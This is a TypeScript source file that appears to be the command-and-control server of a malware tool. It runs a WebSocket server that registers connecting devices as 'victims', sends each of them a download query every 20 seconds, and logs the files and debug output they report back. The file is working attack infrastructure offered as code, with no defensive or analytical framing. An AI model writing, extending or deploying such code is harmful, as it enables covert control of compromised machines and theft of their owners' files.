import { IncomingMessage } from "http";
import WebSocket, { WebSocketServer } from "ws";
import victims, { addVictim, deleteVictim, sendDownloadQueryToVictim } from "./victims";
import Victim from "./classes/Victim";
import WebsocketMessage from "./classes/WebsocketMessage";

const webSocketPort = 25565
var wss : WebSocketServer;

export function initWebsockets(){
    wss = new WebSocketServer({port: webSocketPort});
    console.log("Websocket Server Started");
    wss.on("connection", onConnection);


    setInterval(()=> {
        for(let victim of victims.values()){
            sendDownloadQueryToVictim(victim);
        }
    }, 20 * 1000)
}

function onMessage(ev: WebSocket.MessageEvent){
    var jsonData: WebsocketMessage = JSON.parse(ev.data.toString());
        var victim: Victim = victims.get(jsonData.deviceName) as Victim;
        console.log("Message Recieved from " + victim.devName + " of type " + jsonData.messageType);

        if(jsonData.messageType == "PRINT"){
            victim.debugLines.push(jsonData.content);
            console.log(`${victim.devName} just printed: \n${jsonData.content}`)
        }
        if(jsonData.messageType == "DOWNLOADED_FILES"){
            victim.fileNames = jsonData.content;
        }
}

function onClose(name: string){
    console.log(`Websocket ${name} closed`)
    deleteVictim(name);
}

function onConnection(ws: WebSocket, message: IncomingMessage){
    console.log("Websocket Connected");

    if("device-name" in message.headers){
        var deviceName = message.headers["device-name"] as string;
        var victim: Victim = {
            "ws": ws,
            "debugLines": [],
            "devName": deviceName,
            "fileNames": []
        }
        addVictim(victim);

        sendDownloadQueryToVictim(victim);

        ws.onmessage = onMessage;
        ws.onclose = () => onClose(deviceName);

        console.log(`Device ${deviceName} connected!`)
    } else{
        ws.close();
    }

    
}